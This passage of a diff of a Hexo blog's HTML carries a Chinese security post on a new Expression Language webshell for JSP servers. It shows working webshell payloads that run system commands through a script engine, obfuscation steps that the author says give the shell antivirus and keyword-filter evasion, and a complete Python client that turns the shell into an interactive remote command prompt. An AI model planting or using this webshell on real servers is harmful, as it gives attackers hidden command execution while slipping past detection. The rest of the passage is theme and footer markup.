class="hljs-keyword">catch</span>(e)&#123;&#125;importPackage(Packages.java.util)<span class="hljs-meta">%3bimportPackage</span>(Packages.java<span class="hljs-built_in">.lang</span>)<span class="hljs-meta">%3bimportPackage</span>(Packages.java.io)<span class="hljs-meta">%3bs</span><span class="hljs-meta">%3d</span>[<span class="hljs-number">2</span>]<span class="hljs-meta">%3bs</span>[<span class="hljs-number">0</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;cmd&#x27;</span><span class="hljs-meta">%3bs</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;/c+whoami&#x27;</span><span class="hljs-meta">%3ba</span><span class="hljs-meta">%3d</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-meta">%3bb</span><span class="hljs-meta">%3djava</span><span class="hljs-built_in">.lang</span>.Runtime.getRuntime().exec(s).getInputStream()<span class="hljs-meta">%3boutput</span>+<span class="hljs-meta">%3d</span>+new+BufferedReader(new+InputStreamReader(b))<span class="hljs-meta">%3bwhile</span>+((line<span class="hljs-meta">%3doutput</span>.readLine())+!<span class="hljs-meta">%3d</span>+null)+&#123;a<span class="hljs-meta">%3da</span><span class="hljs-meta">%2bline</span><span class="hljs-meta">%2b</span><span class="hljs-string">&quot;\n&quot;</span>&#125;<span class="hljs-meta">%3ba</span></span><br></code></pre></td></tr></table></figure>
 
 <p>然后执行，没有问题。</p>
-<p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png" alt="image-20220907140219279"></p>
+<p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png" srcset="/img/loading.gif" lazyload alt="image-20220907140219279"></p>
 <h2 id="0x03-进一步混淆"><a href="#0x03-进一步混淆" class="headerlink" title="0x03 进一步混淆"></a>0x03 进一步混淆</h2><p>虽然已经可以通过传递指定js脚本执行命令，但仔细来看</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure>
 
 <p>这段代码还是包含了一些较为敏感的关键字，譬如forName、getEngineByName、eval等，作为一个webshell来讲，显然是不够“干净整洁”的；为进一步混淆，我们可以采用动态传递的方式来替换关键字。</p>
 <p>在EL表达式中，我们知道获取属性可以使用a.b或者a[‘b’]，使用后者就意味着我们可以把所有属性和方法转化成字符串：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&quot;&quot;[&quot;getClass&quot;]()[&quot;forName&quot;](&quot;javax.script.ScriptEngineManager&quot;)[&quot;newInstance&quot;]()[&quot;getEngineByName&quot;](&quot;JavaScript&quot;)[&quot;eval&quot;](&quot;...&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getClass&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;forName&quot;</span>]</span>(&quot;javax.script.ScriptEngineManager&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;newInstance&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getEngineByName&quot;</span>]</span>(&quot;JavaScript&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;eval&quot;</span>]</span>(&quot;...&quot;)&#125;<br></code></pre></td></tr></table></figure>
 
 <p>那么这样做有什么好处呢？</p>
 <p>首先我们可以随意拼接：</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;ge&quot;</span>+<span class="string">&quot;tCl&quot;</span>+<span class="string">&quot;ass&quot;</span>]()[<span class="string">&quot;for&quot;</span>+<span class="string">&quot;Name&quot;</span>](<span class="string">&quot;javax.scr&quot;</span>+<span class="string">&quot;ipt.ScriptEng&quot;</span>+<span class="string">&quot;ineManager&quot;</span>)[<span class="string">&quot;newIn&quot;</span>+<span class="string">&quot;stance&quot;</span>]()[<span class="string">&quot;getEng&quot;</span>+<span class="string">&quot;ineByName&quot;</span>](<span class="string">&quot;java&quot;</span>+<span class="string">&quot;script&quot;</span>)[<span class="string">&quot;e&quot;</span>+<span class="string">&quot;val&quot;</span>](<span class="string">&quot;...&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;ge&quot;</span>+<span class="hljs-string">&quot;tCl&quot;</span>+<span class="hljs-string">&quot;ass&quot;</span>]()[<span class="hljs-string">&quot;for&quot;</span>+<span class="hljs-string">&quot;Name&quot;</span>](<span class="hljs-string">&quot;javax.scr&quot;</span>+<span class="hljs-string">&quot;ipt.ScriptEng&quot;</span>+<span class="hljs-string">&quot;ineManager&quot;</span>)[<span class="hljs-string">&quot;newIn&quot;</span>+<span class="hljs-string">&quot;stance&quot;</span>]()[<span class="hljs-string">&quot;getEng&quot;</span>+<span class="hljs-string">&quot;ineByName&quot;</span>](<span class="hljs-string">&quot;java&quot;</span>+<span class="hljs-string">&quot;script&quot;</span>)[<span class="hljs-string">&quot;e&quot;</span>+<span class="hljs-string">&quot;val&quot;</span>](<span class="hljs-string">&quot;...&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
 
 <p>更重要的是如此我们可以将字符串通过param.xxx来传递，这样就会实现如下的改造：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&quot;&quot;[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure>
 
 <p>测试后可以执行：</p>
-<p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220902101416244.png" alt="image-20220902101416244"></p>
+<p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220902101416244.png" srcset="/img/loading.gif" lazyload alt="image-20220902101416244"></p>
 <p>这种高度精简就实现了将绝大部分代码通过传递来执行，应当具有较好的静态免杀能力。</p>
 <h2 id="0x04-小总结"><a href="#0x04-小总结" class="headerlink" title="0x04 小总结"></a>0x04 小总结</h2><p>这个小思路也是启发于星球里的师傅，同时也想到了之前的RWCTF中的题目，而从本质上讲也许可以把它看作是EL表达式注入的变种。</p>
 <p>我们从最初的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;Runtime.getRuntime().exec(param.cmd)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure>
 
 <p>到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&#x27;&#x27;.getClass().forName(param.spr1).newInstance().getEngineByName(&quot;javascript&quot;).eval(param.spr2)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(param.spr1)<span class="hljs-selector-class">.newInstance</span>()<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&quot;javascript&quot;</span>)<span class="hljs-selector-class">.eval</span>(param.spr2)&#125;<br></code></pre></td></tr></table></figure>
 
 <p>再到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&quot;&quot;[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure>
 
 <p>可以发现这种webshell的优势也很明显：</p>
 <ul>
@@ -185,114 +362,307 @@
 <li><strong>避免出现&lt;%、Class、eval等敏感字符，具有bypass能力</strong>。</li>
 </ul>
 <p>当然这只是个demo，它还可以更美观比如将cmd通过占位符提取出来放到headers里；再比如我们的body有点臃肿，我们直接用python封装实现一个交互式shell也不错。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell_mananger:</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec</span>(<span class="params">cmd:<span class="built_in">str</span>,is_linux:<span class="built_in">bool</span></span>):</span><br><span class="line">    PROXY=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8081&quot;</span>&#125;</span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1:8080/test.jsp&quot;</span></span><br><span class="line"></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&quot;a&quot;</span>:<span class="string">&quot;getClass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;b&quot;</span>:<span class="string">&quot;forName&quot;</span>,</span><br><span class="line">        <span class="string">&quot;c&quot;</span>:<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d&quot;</span>:<span class="string">&quot;newInstance&quot;</span>,</span><br><span class="line">        <span class="string">&quot;e&quot;</span>:<span class="string">&quot;getEngineByName&quot;</span>,</span><br><span class="line">        <span class="string">&quot;f&quot;</span>:<span class="string">&quot;javascript&quot;</span>,</span><br><span class="line">        <span class="string">&quot;g&quot;</span>:<span class="string">&quot;eval&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_linux:</span><br><span class="line">        payload=<span class="string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;/bin/bash&#x27;;s[1]=&#x27;-c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload=<span class="string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;h&quot;</span>: payload</span><br><span class="line">        <span class="comment">#注意这里换行符要对\多转义一次防止py解析</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    res=requests.post(url=url, headers=headers,params=urllib.parse.urlencode(params),</span><br><span class="line">                        data=urllib.parse.urlencode(data),proxies=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    check=<span class="built_in">exec</span>(<span class="string">&quot;id&quot;</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;id&quot;</span> <span class="keyword">in</span> check:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmd=<span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;[command]&gt;&gt;&quot;</span>))</span><br><span class="line">            <span class="comment"># print(cmd)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">exec</span>(cmd,<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmd=<span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;[command]&gt;&gt;&quot;</span>))</span><br><span class="line">            <span class="comment"># print(cmd)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">exec</span>(cmd,<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
-      
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#shell_mananger:</span><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>(<span class="hljs-params">cmd:<span class="hljs-built_in">str</span>,is_linux:<span class="hljs-built_in">bool</span></span>):<br>    PROXY=&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8081&quot;</span>&#125;<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:8080/test.jsp&quot;</span><br><br>    headers=&#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36&quot;</span>,<br><br>        &#125;<br><br>    params=&#123;<br>        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;getClass&quot;</span>,<br>        <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-string">&quot;forName&quot;</span>,<br>        <span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>,<br>        <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;newInstance&quot;</span>,<br>        <span class="hljs-string">&quot;e&quot;</span>:<span class="hljs-string">&quot;getEngineByName&quot;</span>,<br>        <span class="hljs-string">&quot;f&quot;</span>:<span class="hljs-string">&quot;javascript&quot;</span>,<br>        <span class="hljs-string">&quot;g&quot;</span>:<span class="hljs-string">&quot;eval&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> is_linux:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;/bin/bash&#x27;;s[1]=&#x27;-c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br><br>    data=&#123;<br>        <span class="hljs-string">&quot;h&quot;</span>: payload<br>        <span class="hljs-comment">#注意这里换行符要对\多转义一次防止py解析</span><br>    &#125;<br>    <span class="hljs-comment"># print(data)</span><br>    res=requests.post(url=url, headers=headers,params=urllib.parse.urlencode(params),<br>                        data=urllib.parse.urlencode(data),proxies=<span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> res.text<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    check=<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-keyword">in</span> check:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>新型EL webshell初探</div>
+      <div>http://example.com/2022/09/12/新型EL-webshell初探/</div>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/" data-id="cl7ym14rg0001soilbz0cguvn" data-title="新型EL webshell初探" class="article-share-link">Share</a>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>springtime</div>
+        </div>
       
       
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>September 12, 2022</div>
+        </div>
       
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-  
-    <a href="/2022/09/12/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Hello World</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/">新型EL webshell初探</a>
-          </li>
-        
-          <li>
-            <a href="/2022/09/12/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
+      
+      <div class="license-meta-item">
+        <div>Licensed under</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2022 springtime<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
+    <div class="license-icon iconfont"></div>
   </div>
-</footer>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/12/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
 
     </div>
-    <nav id="mobile-nav">
+  </div>
+</div>
+
+
+
+
+
   
-    <a href="/" class="mobile-nav-link">Home</a>
+
+
+
   
-    <a href="/archives" class="mobile-nav-link">Archives</a>
+
+
+
   
-</nav>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
     
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.4.1.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
 
-<script src="/js/script.js"></script>
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
